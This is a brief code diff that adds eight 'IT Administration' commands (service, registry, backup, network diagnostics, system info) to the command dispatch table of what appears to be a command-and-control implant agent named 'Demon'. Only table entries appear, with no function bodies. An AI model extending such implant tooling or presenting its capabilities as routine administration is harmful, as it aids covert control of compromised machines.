@@ -37,6 +37,16 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_MEM_FILE,                 .Function = CommandMemFile                  },
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
 
+        /* IT Administration Commands */
+        { .ID = DEMON_COMMAND_SYSINFO,                  .Function = CommandSysInfo                  },
+        { .ID = DEMON_COMMAND_SERVICE,                  .Function = CommandService                  },
+        { .ID = DEMON_COMMAND_REGISTRY,                 .Function = CommandRegistry                 },
+        { .ID = DEMON_COMMAND_BACKUP,                   .Function = CommandBackup                   },
+        { .ID = DEMON_COMMAND_NETDIAG,                  .Function = CommandNetDiag                  },
+        { .ID = DEMON_COMMAND_HWINFO,                   .Function = CommandHwInfo                   },
+        { .ID = DEMON_COMMAND_SOFTINFO,                 .Function = CommandSoftInfo                 },
+        { .ID = DEMON_COMMAND_SYSHEALTH,                .Function = CommandSysHealth                },
+
         // End
         { .ID = 0, .Function = NULL }
 };
